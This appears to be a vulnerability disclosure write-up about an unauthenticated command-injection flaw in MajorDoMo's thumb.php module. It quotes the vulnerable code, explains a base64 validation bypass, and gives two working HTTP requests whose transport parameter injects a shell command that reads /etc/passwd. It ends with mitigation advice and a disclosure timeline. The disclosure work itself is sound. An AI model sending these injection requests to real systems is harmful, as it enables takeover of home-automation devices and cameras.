**Deep Dive: Unmasking an Unauthenticated Remote Code Execution Flaw in MajorDoMo's Thumb Module**

## Introduction

MajorDoMo, a beacon in Russian home automation, particularly favored by Raspberry Pi aficionados, has been a trusted name for over a decade. With over 380 stars on its [official GitHub repository](https://github.com/sergejey/majordomo) at the time of writing, its popularity is evident. However, lurking within its `thumb.php` module is a severe unauthenticated Remote Code Execution (RCE) vulnerability. This article intricately explores this critical flaw, detailing its roots, distinct exploitation methods, and possible ramifications.

## Probing the Vulnerable Code

Nestled within MajorDoMo's `/modules/thumb/thumb.php`, a script designed for thumbnail generation, is a major oversight ripe for exploitation.

### The Central Issue

The script's handling of the `url` and `transport` parameters, which culminate into system commands, is particularly problematic:

```php
$url = base64_decode($url);
...
$cmd = PATH_TO_FFMPEG . ' ' . $stream_options . ' ' . $img;
```

This presents a golden opportunity for arbitrary command injections.

## Exploitation Avenues

### 1. Bypassing URL Validation

The script's initial validation checks are:

```php
if (preg_match('/^rtsp:/is', $url) || preg_match('/\/dev/',$url)) {
    ...
}
```

Using a base64-encoded string that, after decoding, aligns with patterns like `rtsp:` or contains `/dev` can effortlessly sidestep this validation. For instance, `cnRzcDovL2EK` decodes to `rtsp://a`, satisfying the checks.

### 2. The `transport` Parameter: A Key to Command Injection

The vulnerability becomes glaring with the `transport` parameter:

```php
if ($_GET['transport']) {
    $stream_options = '-rtsp_transport ' . $_GET['transport'] . ' ' . $stream_options;
}
```

Tailoring this parameter allows for malicious command insertion.

#### Exploitation Samples:

**a. Debug Mode**:

```http
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=||echo;%20echo%20$(cat%20%20/etc/passwd)%23;
```

**b. Streaming Mode**:

```http
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&live=1&transport=||echo;%20echo%20$(cat%20%20/etc/passwd)%23;
```

In both cases, the `||` characters help break out of the intended command, allowing the execution of the subsequent `echo` command.

## Implications

This RCE vulnerability is not to be taken lightly. With MajorDoMo's pivotal role in home automation, exploitation can result in compromising physical security systems, taking over cameras, or even hijacking other IoT devices.

## Mitigation

- **Thorough Input Validation**: All input must be rigorously validated.
- **Sanitize Before Execution**: Avoid using user inputs in system commands without comprehensive sanitization.
- **Limit Direct Command Execution**: Rely more on built-in functions or APIs over direct system command execution.

## Conclusion

This exploration highlights the paramount importance of meticulous code reviews and rigorous validation. Even established projects like MajorDoMo are not immune to critical vulnerabilities, underscoring the need for a proactive security posture in all development phases.


# Responsible Disclosure Process:

```
October 29, 2023: Contacted the vendor to notify them of the vulnerability.
November 5, 2023: If no response is received from the vendor, I will initiate the process to reserve a CVE ID for the vulnerability.
```